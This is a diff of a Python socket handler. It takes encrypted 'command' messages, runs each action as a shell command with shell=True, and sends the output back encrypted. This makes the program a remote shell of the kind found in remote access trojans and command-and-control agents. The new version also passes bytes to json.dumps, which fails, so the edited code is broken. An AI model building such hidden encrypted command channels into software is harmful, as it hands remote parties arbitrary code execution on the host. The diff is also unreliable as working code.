@@ -45,33 +45,18 @@ def main():
 
 
             if data['type'] == 'command':
-                if system_os == 'Windows':
 
-                    command = data['action']
-                    result = subprocess.run(command)
-                    # result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                command = data['action']
+                result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
-                    response = json.dumps({
-                        'status': 'OK',
-                        'response': result.stdout
-                    }).encode('utf-8')
+                response = json.dumps({
+                    'status': 'OK',
+                    'response': result.stdout.encode('utf-8')
+                }).encode('utf-8')
 
-                    print(response)
+                print(response)
 
-                    conn.sendall(cipher.encrypt_message(response))
-                else:
-                    command = data['action']
-                    # result = subprocess.run(command)
-                    result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-                    response = json.dumps({
-                        'status': 'OK',
-                        'response': result.stdout
-                    }).encode('utf-8')
-
-                    print(response)
-
-                    conn.sendall(cipher.encrypt_message(response))
+                conn.sendall(cipher.encrypt_message(response))
 
             # response = cipher.encrypt_message(f"Commands received: {data['command']}")
             #conn.sendall(cipher.encrypt_message(response))
